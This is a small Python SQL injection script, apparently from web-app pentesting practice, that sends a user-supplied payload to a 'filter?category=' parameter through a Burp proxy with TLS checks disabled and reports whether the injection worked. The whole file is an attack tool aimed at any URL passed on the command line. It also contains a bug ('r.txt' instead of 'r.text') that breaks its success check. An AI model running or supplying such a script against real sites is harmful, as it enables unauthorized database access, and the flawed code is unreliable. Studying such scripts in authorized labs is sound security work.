#sql injection based on url provided and the payload intended to be injected
import sys
import urllib3
import requests #allows http/https request for app pentesting
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)#remove unverified https request warnings
#proxies are used for debugging your script
proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}#This will run through the burpsuite proxy

def exploit_sqli(url, payload):
    uri = 'filter?category=' #should be adjusted depending on the app
    r = requests.get(url + uri + payload, verify = False, proxies=proxies)
    if 'PutItemInR' in r.txt:#PutItemInR= item in r ...should be adjusted every time you run it on a new app
        return True
    else:
        return False



if __name__ =='__main__':
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()

    except IndexError:
        print("[-] usage: %s <url> <payload>" % sys.argv[0])
        print("[+] Example: %s www.example.com '1=1'" % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print('[+] sql injection successful...')
    else:
        print('[-] sql injection unsuccessful...')
